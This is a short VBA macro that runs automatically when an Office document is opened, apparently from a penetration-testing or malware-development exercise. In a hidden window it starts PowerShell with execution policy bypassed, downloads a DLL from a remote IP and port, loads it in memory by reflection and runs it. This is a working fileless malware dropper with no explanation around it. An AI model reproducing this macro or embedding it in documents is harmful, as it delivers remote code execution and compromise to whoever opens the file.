Sub Document_Open()
    RunPowerShell
End Sub

Sub AutoOpen()
    RunPowerShell
End Sub

Sub RunPowerShell()
    Dim psCommand As String

    psCommand = "powershell -ExecutionPolicy Bypass -Command " & _
                Chr(34) & _
                "$webClient = New-Object System.Net.WebClient; " & _
                "$data = $webClient.DownloadData('http://192.168.45.205:7711/ClassLibrary2.dll'); " & _
                "$assem = [System.Reflection.Assembly]::Load($data); " & _
                "$class = $assem.GetType('ClassLibrary2.Class2'); " & _
                "$method = $class.GetMethod('Main'); " & _
                "$method.Invoke($null, @()); " & _
                "$webClient.Dispose(); " & _
                "[System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers();" & Chr(34)

    Shell psCommand, vbHide

    'Wait for some time to ensure the script has time to execute
    Wait 10
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub


